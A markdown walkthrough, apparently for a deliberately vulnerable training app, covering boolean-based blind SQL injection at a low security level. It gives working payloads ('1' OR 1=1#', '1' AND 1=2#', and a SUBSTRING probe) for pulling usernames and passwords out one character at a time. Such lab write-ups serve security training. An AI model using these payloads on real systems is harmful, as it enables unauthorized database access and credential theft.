
### ✅ File: `challenges/sql-injection-blind/low.md`

```markdown
# 🧨 Blind SQL Injection – Low Security Level

### 🛠️ Objective:
Extract information from the database using Boolean-based blind SQL injection techniques.

---

### 🧭 Walkthrough

1. Navigate to the Blind SQL Injection page.
2. Enter a simple numeric ID, like:
```

1

```
✅ Returns a valid message like: `User ID exists in the database.`

3. Now test with an invalid value:
```

999

````
❌ Returns: `User ID is MISSING from the database.`

---

### 🧪 Testing for Injection

Try a payload that always evaluates to true:
```sql
1' OR 1=1#
````

✅ Output: `User ID exists in the database.`

Try a false condition:

```sql
1' AND 1=2#
```

❌ Output: `User ID is MISSING from the database.`

---

### 🧩 Extracting Data (Boolean-Based)

Try identifying the first letter of the username for `user_id=1`:

```sql
1' AND SUBSTRING(user,1,1)='a'#
```

Keep testing different letters until the response is true.

You can iterate character by character to extract:

* `user`
* `password`

---

### 🧩 Summary

* ✅ Boolean-based blind injection is possible
* ❌ No output, relies on behavior changes
* 🟢 Good for training blind SQLi logic

## ✅ Status

* ✅ Fully exploitable
* 🟢 Beginner-friendly (requires patience)
